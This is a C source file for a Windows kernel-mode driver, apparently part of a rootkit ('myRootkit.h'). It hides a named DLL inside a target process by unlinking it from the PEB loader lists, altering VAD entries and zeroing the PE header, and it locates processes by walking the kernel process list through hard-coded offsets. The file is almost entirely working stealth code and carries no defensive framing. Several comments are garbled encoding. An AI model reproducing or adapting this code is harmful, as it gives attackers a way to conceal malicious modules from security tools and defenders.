#include "Module.h"
#include "myRootkit.h"
#include <ntimage.h>

#include "cfg.h"

#define dprintf if (DBG) DbgPrint
#define nprintf DbgPrint

#define kmalloc(_s)	ExAllocatePoolWithTag(NonPagedPool, _s, 'SYSQ')

#define kfree(_p)	ExFreePool(_p)

// Device driver routine declarations.
//
#define  MEM_IMAGE 0x01000000

NTSTATUS
DriverEntry(
	IN PDRIVER_OBJECT		DriverObject,
	IN PUNICODE_STRING		RegistryPath
	);

NTSTATUS
SuperhidedllDispatchCreate(
	IN PDEVICE_OBJECT		DeviceObject,
	IN PIRP					Irp
	);

NTSTATUS
SuperhidedllDispatchClose(
	IN PDEVICE_OBJECT		DeviceObject,
	IN PIRP					Irp
	);

NTSTATUS
SuperhidedllDispatchDeviceControl(
	IN PDEVICE_OBJECT		DeviceObject,
	IN PIRP					Irp
	);

VOID
SuperhidedllUnload(
	IN PDRIVER_OBJECT		DriverObject
	);
typedef BOOLEAN (*PARSE_VADTREE_ROUTINE)(
	IN PMMVAD VadNode,
	IN PVOID Context
	);

VOID ShowDllFromPEB(PEPROCESS Process,char *szDllName);
VOID ParseVadTree(PMMVAD VadNode);
VOID MyParseVadTreeRoutine(PMMVAD VadNode);
VOID ShowDllFromVAD(PEPROCESS Process,ULONG DllBase);
VOID ZeroPEHeader(ULONG ImageBase);
VOID HideDllFromProcess(PEPROCESS Process,char *szDllName);
BOOL HideDllFromProcessPEB(PEPROCESS Process,ULONG DllBase);
VOID HideDllFromProcessVAD(PEPROCESS Process,ULONG DllBase);
PEPROCESS GetProcessByName(char *szImageName);

#ifdef ALLOC_PRAGMA
#pragma alloc_text(INIT, DriverEntry)
#pragma alloc_text(PAGE, SuperhidedllDispatchCreate)
#pragma alloc_text(PAGE, SuperhidedllDispatchClose)
#pragma alloc_text(PAGE, SuperhidedllDispatchDeviceControl)
#pragma alloc_text(PAGE, SuperhidedllUnload)
#endif // ALLOC_PRAGMA

ULONG EPROCESS_PEB_OFFSET=0x1b0;
ULONG EPROCESS_VADROOT_OFFSET=0x11c;
ULONG EPROCESS_IMAGENAME_OFFSET=0x174;
ULONG EPROCESS_ACTIVEPROCESSLINK_OFFSET=0x88;
ULONG g_DllBase=0;//�����ص�DLL�Ļ�ַ

//�ȴ�PEB�л�ȡ�����ص�DLL�Ļ�ַ
ULONG GetDllBaseFromProcessPEB(PEPROCESS Process,char *szDllName)
{
	ULONG Peb;
	PPEB_LDR_DATA pLdrData;
	PLDR_DATA_TABLE_ENTRY pLdrDataEntry;
	PLIST_ENTRY pListHead,pListNext;
	ANSI_STRING ansiDllName;
	ULONG DllBase=0;
	Peb=*(ULONG*)((char*)Process+EPROCESS_PEB_OFFSET);
	dprintf("PEB=0x%08X\n",Peb);
	__try
	{
		pLdrData=(PPEB_LDR_DATA)*(ULONG*)((char*)Peb+0xC);
		pListHead=&(pLdrData->InLoadOrderModuleList);
		pListNext=pListHead->Flink;
		for (pListHead;pListNext!=pListHead;pListNext=pListNext->Flink)
		{
			pLdrDataEntry=(PLDR_DATA_TABLE_ENTRY)pListNext;
			if (pLdrDataEntry->BaseDllName.Buffer)
			{
				RtlUnicodeStringToAnsiString(&ansiDllName,& (pLdrDataEntry->BaseDllName),TRUE);
				//dprintf("Base=0x%08X %s\n",pLdrDataEntry->DllBase,ansiDllName.Buffer);
				if (!_stricmp(szDllName,ansiDllName.Buffer))
				{
					DllBase=(ULONG)pLdrDataEntry->DllBase;
				}
				RtlFreeAnsiString(&ansiDllName);
				//���ҵ����˳�ѭ��
				if (DllBase) break;
			}//end of if
			
		}
		return DllBase;
	}
	__except(EXCEPTION_EXECUTE_HANDLER)
	{
		Dbg("Error occured while searching module in PEB.\n");
		return 0;
	}
}

BOOL HideDllFromProcessPEB(PEPROCESS Process,ULONG DllBase)
{
	ULONG Peb;
	PPEB_LDR_DATA pLdrData;
	PLDR_DATA_TABLE_ENTRY pLdrDataEntry;
	PLIST_ENTRY pListHead,pListNext;
	BOOL bHideOK=0;
	dprintf("Hiding Dll from Process PEB...\n");
	Peb=*(ULONG*)((char*)Process+EPROCESS_PEB_OFFSET);
	dprintf("PEB=0x%08X\n",Peb);
	__try
	{
		pLdrData=(PPEB_LDR_DATA)*(ULONG*)((char*)Peb+0xC);
		pListHead=&(pLdrData->InLoadOrderModuleList);
		pListNext=pListHead->Flink;
		for (pListHead;pListNext!=pListHead;pListNext=pListNext->Flink)
		{
			pLdrDataEntry=(PLDR_DATA_TABLE_ENTRY)pListNext;
			if (DllBase==(ULONG)pLdrDataEntry->DllBase)
			{
				//Found target dll , then remove it from the three lists.
				RemoveEntryList(&(pLdrDataEntry->InLoadOrderLinks));
				RemoveEntryList(&(pLdrDataEntry->InMemoryOrderLinks));
				RemoveEntryList(&(pLdrDataEntry->InInitializationOrderLinks));
				bHideOK=TRUE;
				break;
			}
		}
		return bHideOK;
	}
	__except(EXCEPTION_EXECUTE_HANDLER)
	{
		Dbg("Error Occured.\n");
		return FALSE;
	}
}


VOID HideDllFromProcessVAD(PEPROCESS Process,ULONG DllBase)
{
	PMMVAD VadRoot;
	dprintf("Hiding Dll from Process VAD...\n");
	VadRoot=(PMMVAD)*(ULONG*)((char*)Process+EPROCESS_VADROOT_OFFSET);
	dprintf("VadRoot=0x%08X\n",VadRoot);
	ParseVadTree(VadRoot);
	
}

//ǰ�����
VOID ParseVadTree(PMMVAD VadNode)
{
	if (VadNode!=NULL)
	{
		ParseVadTree(VadNode->LeftChild);
		MyParseVadTreeRoutine(VadNode);
		ParseVadTree(VadNode->RightChild);
	}
	
}

VOID MyParseVadTreeRoutine(PMMVAD VadNode)
{
	PCONTROL_AREA pControlArea=NULL;
	PFILE_OBJECT FileObject=NULL;
	/*
	dprintf("DllBase=0x%08X Vad=0x%08X StartVpn=0x%08X EndingVpn=0x%08X\n",
		g_DllBase,VadNode,(VadNode->StartingVpn)<<12,(VadNode->EndingVpn)<<12);
	*/
	if (g_DllBase == (VadNode->StartingVpn)<<12 )
	{
		//ȥ��MEM_IMAGE��־��δ����Ч��
		VadNode->LongFlags &= ~MEM_IMAGE;
		//����FILE_OBJECT
		pControlArea=VadNode->ControlArea;
		if (pControlArea)
		{
			FileObject=pControlArea->FilePointer;
			if (FileObject && FileObject->FileName.Buffer)
			{
				dprintf("Found FileObject=0x%08X\n",FileObject);
				RtlZeroMemory(FileObject->FileName.Buffer,2);
			}
		}
	}
}


//��������
VOID HideDllFromProcess(PEPROCESS Process,char *szDllName)
{
	//�ȴ�PEB���ҵ�Ŀ��DLL����ȡ���ַ
	KeAttachProcess(Process);
	g_DllBase=GetDllBaseFromProcessPEB(Process,szDllName);
	KeDetachProcess();
	if (!g_DllBase)
	{
		//�Ҳ�����ֱ�ӷ���
		dprintf("Dll %s not found.\n",szDllName);
		return;
	}
	dprintf("Get Base of %s Successfully,Base=0x%08X\n",szDllName,g_DllBase);
	//��VADTree->ControlArea->FilePointer->Buffer��Ĩ��
	//HideDllFromProcessVAD(Process,g_DllBase);
	//
	KeAttachProcess(Process);
	//�Ƚ����PEB->Ldr����ժ��
	HideDllFromProcessPEB(Process,g_DllBase);
	//Ĩ��PEͷ
	//ZeroPEHeader(g_DllBase);

	KeDetachProcess();
}

VOID ZeroPEHeader(ULONG ImageBase)
{
	PIMAGE_DOS_HEADER pDosHeader;
	char *pNtHeader;
	PIMAGE_OPTIONAL_HEADER pOptinalHeader;
	ULONG HeaderSize=0;
	PMDL pHeaderMdl;
	PVOID NewBuffer;
	__try
	{
		pDosHeader=(PIMAGE_DOS_HEADER)ImageBase;
		pNtHeader=(char*)ImageBase+pDosHeader->e_lfanew;
		pOptinalHeader=(PIMAGE_OPTIONAL_HEADER)(pNtHeader+4+sizeof(IMAGE_FILE_HEADER));
		HeaderSize=pOptinalHeader->SizeOfHeaders;
		dprintf("Image Header Size=0x%X\n",HeaderSize);
		pHeaderMdl=IoAllocateMdl((PVOID)ImageBase,HeaderSize,FALSE,FALSE,NULL);
		dprintf("pHeaderMdl=0x%08X\n",pHeaderMdl);
		NewBuffer=MmGetSystemAddressForMdl(pHeaderMdl);
		dprintf("NewBuffer=0x%08X\n",NewBuffer);
		RtlZeroMemory(NewBuffer,HeaderSize);
		MmUnmapLockedPages(NewBuffer,pHeaderMdl);
		IoFreeMdl(pHeaderMdl);
		//��Ҫ������н��̣���ʹ�����·�������ʱCOW����ʧЧ
		/*
		WPOFF();
		RtlZeroMemory((char*)ImageBase,HeaderSize);
		WPON();
		*/
	}
	__except(EXCEPTION_EXECUTE_HANDLER)
	{
		Dbg("Error occured while zero pe header.\n");
		return ;
	}
	
	
}


//���ݽ������Ʋ�����Ӧ�Ľ��̶���
PEPROCESS GetProcessByName(char *szImageName)
{
	PLIST_ENTRY pListHead,pListNext;
	PEPROCESS Process=NULL,ProcessResult=NULL;
	Process=PsGetCurrentProcess();
	pListHead=(PLIST_ENTRY)((char*)Process+EPROCESS_ACTIVEPROCESSLINK_OFFSET);
	pListNext=pListHead->Flink;
	for (pListHead;pListNext!=pListHead;pListNext=pListNext->Flink)
	{
		Process=(PEPROCESS)((char*)pListNext-EPROCESS_ACTIVEPROCESSLINK_OFFSET);
		if (!_strnicmp((char*)Process+EPROCESS_IMAGENAME_OFFSET,szImageName,strlen(szImageName)))
		{
			dprintf("Found %s EPROCESS=0x%08X\n",szImageName,Process);
			ProcessResult=Process;
			break;
		}
	}
	return ProcessResult;
}

int HideDll(char pname[],char modname[])
{
	PEPROCESS Process; 

	Process=GetProcessByName(pname);
	if (Process)
	{
		//�򵥲���,����Explorer.exe�е�kernel32.dll
		HideDllFromProcess(Process,modname);
		
		return 1;
	}
	else
	{
		Dbg("Could not found target process.\n");
	}

    return 0;
}
